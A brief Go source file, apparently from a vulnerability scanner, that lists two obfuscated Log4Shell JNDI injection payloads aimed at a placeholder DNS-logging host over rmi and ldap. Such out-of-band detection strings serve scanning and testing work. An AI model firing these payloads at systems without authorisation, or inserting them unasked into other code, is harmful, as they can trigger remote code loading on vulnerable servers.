package log4j

var (
	log4jJndiPayloads = []string{
		"${${::-j}ndi:rmi://dnslog-url}",
		"${DATE:${${::-J}n${::-D}i:${::-l}d${::-a}p:${::-/}${::-/}dnslog-url}}",
	}
)
